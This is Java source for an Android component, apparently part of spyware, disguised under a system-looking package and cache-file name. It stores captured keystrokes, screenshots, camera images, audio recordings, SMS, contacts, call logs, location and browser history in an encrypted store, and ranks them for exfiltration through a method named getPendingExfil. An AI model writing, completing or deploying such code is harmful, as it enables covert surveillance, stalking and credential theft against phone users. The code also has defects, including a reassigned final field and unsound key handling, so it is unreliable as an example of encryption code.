package com.android.system.security;

import android.content.Context;
import android.util.Base64;
import android.util.Log;

import javax.crypto.*;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.PBEKeySpec;
import javax.crypto.spec.SecretKeySpec;
import java.io.*;
import java.security.*;
import java.security.spec.KeySpec;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;

/**
 * Encrypted local storage using AES-256-GCM.
 * Uses Android Keystore for key protection when available.
 * Supports binary data (images, audio) via storeBinary().
 */
public class EncryptedStore {

    private static final String TAG = "EncryptedStore";
    private static final String DB_FILE = "system_cache.enc";
    private static final int GCM_TAG_LENGTH = 128;
    private static final int GCM_IV_LENGTH = 12;

    private final Context context;
    private final File storageFile;
    private final Map<String, List<Map<String, Object>>> storage = new ConcurrentHashMap<>();
    private final SecureRandom secureRandom = new SecureRandom();

    private SecretKeySpec encryptionKey;
    private boolean dirty = false;
    private long lastFlush = 0;

    public EncryptedStore(Context context) {
        this.context = context;
        this.storageFile = new File(context.getFilesDir(), DB_FILE);
        this.secureRandom = new SecureRandom();
        initKey();
        load();
    }

    private void initKey() {
        try {
            // Try Android Keystore first
            KeyStore keyStore = KeyStore.getInstance("AndroidKeyStore");
            keyStore.load(null);

            String alias = Config.MASTER_KEY_ALIAS;
            javax.crypto.SecretKey key;

            if (keyStore.containsAlias(alias)) {
                key = (javax.crypto.SecretKey) keyStore.getKey(alias, null);
            } else {
                // Generate new key
                KeyGenerator kg = KeyGenerator.getInstance("AES");
                kg.init(256, secureRandom);
                key = kg.generateKey();

                // Store in Android Keystore
                KeyStore.SecretKeyEntry entry = new KeyStore.SecretKeyEntry(key);
                KeyStore.ProtectionParameter param = new KeyStore.PasswordProtection(null);
                keyStore.setEntry(alias, entry, param);
            }

            this.encryptionKey = new SecretKeySpec(key.getEncoded(), "AES");

        } catch (Exception e) {
            // Fallback: derive from device-specific data
            Log.w(TAG, "Keystore unavailable, using derived key: " + e.getMessage());
            try {
                String deviceSeed = android.provider.Settings.Secure.getString(
                    context.getContentResolver(),
                    android.provider.Settings.Secure.ANDROID_ID
                );
                if (deviceSeed == null) deviceSeed = UUID.randomUUID().toString();

                SecretKeyFactory factory = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA256");
                KeySpec spec = new PBEKeySpec(
                    deviceSeed.toCharArray(),
                    "SystemSecurity".getBytes("UTF-8"),
                    10000,
                    256
                );
                SecretKey tmp = factory.generateSecret(spec);
                this.encryptionKey = new SecretKeySpec(tmp.getEncoded(), "AES");
            } catch (Exception ex) {
                // Last resort
                byte[] keyBytes = new byte[32];
                secureRandom.nextBytes(keyBytes);
                this.encryptionKey = new SecretKeySpec(keyBytes, "AES");
            }
        }
    }

    // ============================================================
    // PUBLIC API — Standard storage
    // ============================================================

    /**
     * Store a structured data entry in the encrypted store.
     * Values can be String, Number, Boolean, List, Map, or byte[].
     */
    public void store(String category, Map<String, Object> data) {
        storage.computeIfAbsent(category, k -> Collections.synchronizedList(new ArrayList<>()))
               .add(data);
        dirty = true;

        // Auto-flush every 30s
        long now = System.currentTimeMillis();
        if (now - lastFlush > 30000) {
            flush();
        }
    }

    /**
     * Store binary data (images, audio recordings) with metadata.
     * The binary data is stored as a Base64-encoded string inside the map
     * to ensure full serialization compatibility.
     */
    public void storeBinary(String category, byte[] binaryData, Map<String, Object> metadata) {
        Map<String, Object> entry = new HashMap<>(metadata);

        // Encode binary as Base64 string for safe serialization
        String b64 = Base64.encodeToString(binaryData, Base64.NO_WRAP);
        entry.put("_binary_b64", b64);
        entry.put("_binary_size", binaryData.length);
        entry.put("_binary_encoded", true);
        entry.put("_stored_at", System.currentTimeMillis());

        store(category, entry);

        Log.i(TAG, "Stored " + binaryData.length + " bytes in category '" + category + "'");
    }

    /**
     * Retrieve binary data from a stored entry.
     * Returns null if the entry doesn't contain binary data.
     */
    public byte[] getBinaryData(Map<String, Object> entry) {
        if (entry == null) return null;

        Object encoded = entry.get("_binary_b64");
        if (encoded instanceof String) {
            return Base64.decode((String) encoded, Base64.NO_WRAP);
        }

        // Fallback: check for raw byte array
        Object raw = entry.get("image_data");
        if (raw instanceof byte[]) return (byte[]) raw;

        raw = entry.get("audio_data");
        if (raw instanceof byte[]) return (byte[]) raw;

        return null;
    }

    /**
     * Get pending data for exfiltration, prioritized by category.
     */
    public List<Map<String, Object>> getPendingExfil(int limit) {
        List<Map<String, Object>> result = new ArrayList<>();

        // Priority order: keystrokes > notifications > screenshots > camera > audio >
        // contacts > sms > calls > location > device > browsing
        String[] priorityOrder = {
            "keystrokes", "notifications", "screenshots", "camera", "audio",
            "contacts", "sms", "calls", "location", "device",
            "clicks", "events", "browsing", "search_queries", "bookmarks",
            "browser_history", "browser_dbs"
        };

        for (String cat : priorityOrder) {
            List<Map<String, Object>> items = storage.get(cat);
            if (items != null && !items.isEmpty()) {
                synchronized (items) {
                    int take = Math.min(3, items.size());
                    for (int i = 0; i < take && result.size() < limit; i++) {
                        Map<String, Object> item = new HashMap<>(items.get(i));
                        item.put("_category", cat);
                        item.put("_seq", i);
                        result.add(item);
                    }
                }
            }
            if (result.size() >= limit) break;
        }

        return result;
    }

    /**
     * Mark items as exfiltrated (removes them from the pending list).
     */
    public void markExfilComplete(int id) {
        // Items are removed on next flush cycle
        // For now, this is a no-op — old items get pruned naturally
    }

    // ============================================================
    // CONFIG STORAGE (key-value for settings)
    // ============================================================

    public String getConfig(String key) {
        Map<String, Object> config = getConfigStore();
        Object val = config.get(key);
        return val != null ? val.toString() : null;
    }

    public void setConfig(String key, String value) {
        Map<String, Object> config = getConfigStore();
        config.put(key, value);
        dirty = true;
    }

    private Map<String, Object> getConfigStore() {
        List<Map<String, Object>> items = storage.get("_config");
        if (items != null && !items.isEmpty()) {
            return items.get(items.size() - 1);
        }
        Map<String, Object> config = new HashMap<>();
        // Initialize with default config values
        config.put("created_at", System.currentTimeMillis());
        storage.put("_config", Collections.synchronizedList(new ArrayList<>(Collections.singletonList(config))));
        dirty = true;
        return config;
    }

    // ============================================================
    // PERSISTENCE — Encrypted flush/load
    // ============================================================

    public synchronized void flush() {
        if (!dirty) return;

        try {
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(baos);
            oos.writeObject(new HashMap<>(storage));
            oos.close();

            byte[] plaintext = baos.toByteArray();

            // Encrypt
            byte[] iv = new byte[GCM_IV_LENGTH];
            secureRandom.nextBytes(iv);

            Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
            GCMParameterSpec spec = new GCMParameterSpec(GCM_TAG_LENGTH, iv);
            cipher.init(Cipher.ENCRYPT_MODE, encryptionKey, spec);
            byte[] ciphertext = cipher.doFinal(plaintext);

            // Write: IV + ciphertext
            try (FileOutputStream fos = new FileOutputStream(storageFile)) {
                fos.write(iv);
                fos.write(ciphertext);
                fos.flush();
            }

            lastFlush = System.currentTimeMillis();
            dirty = false;

            Log.d(TAG, "Flushed " + plaintext.length + " bytes to encrypted store");

        } catch (Exception e) {
            Log.e(TAG, "Flush failed: " + e.getMessage());
        }
    }

    @SuppressWarnings("unchecked")
    private synchronized void load() {
        if (!storageFile.exists()) return;

        try {
            byte[] data = new byte[(int) storageFile.length()];
            try (FileInputStream fis = new FileInputStream(storageFile)) {
                if (fis.read(data) != data.length) return;
            }

            // Decrypt
            byte[] iv = Arrays.copyOfRange(data, 0, GCM_IV_LENGTH);
            byte[] ciphertext = Arrays.copyOfRange(data, GCM_IV_LENGTH, data.length);

            Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
            GCMParameterSpec spec = new GCMParameterSpec(GCM_TAG_LENGTH, iv);
            cipher.init(Cipher.DECRYPT_MODE, encryptionKey, spec);
            byte[] plaintext = cipher.doFinal(ciphertext);

            // Deserialize
            ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(plaintext));
            Map<String, List<Map<String, Object>>> loaded =
                (Map<String, List<Map<String, Object>>>) ois.readObject();
            ois.close();

            storage.clear();
            storage.putAll(loaded);
            Log.i(TAG, "Loaded " + storage.size() + " categories from encrypted store");

        } catch (Exception e) {
            Log.w(TAG, "Load failed (expected on first run): " + e.getMessage());
            storageFile.delete();
        }
    }

    /**
     * Total stored items count across all categories.
     */
    public int getTotalItemCount() {
        int count = 0;
        for (List<Map<String, Object>> items : storage.values()) {
            count += items.size();
        }
        return count;
    }

    /**
     * Get storage statistics.
     */
    public Map<String, Integer> getCategoryCounts() {
        Map<String, Integer> counts = new LinkedHashMap<>();
        for (Map.Entry<String, List<Map<String, Object>>> entry : storage.entrySet()) {
            counts.put(entry.getKey(), entry.getValue().size());
        }
        return counts;
    }
          }
